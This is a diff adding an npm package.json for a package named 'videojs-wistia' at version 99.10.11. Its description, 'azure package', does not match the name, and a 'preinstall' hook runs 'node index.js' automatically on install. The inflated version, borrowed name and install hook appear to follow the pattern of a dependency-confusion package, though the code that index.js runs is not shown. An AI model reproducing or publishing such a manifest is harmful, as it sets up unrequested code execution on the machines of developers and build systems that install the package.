@@ -1,0 +1,12 @@
+{
+  "name": "videojs-wistia",
+  "version": "99.10.11",
+  "description": "azure package",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo 'error no test specified' && exit 1",
+  "preinstall":"node index.js"
+  },
+  "author":"",
+  "License":"ISC"
+}
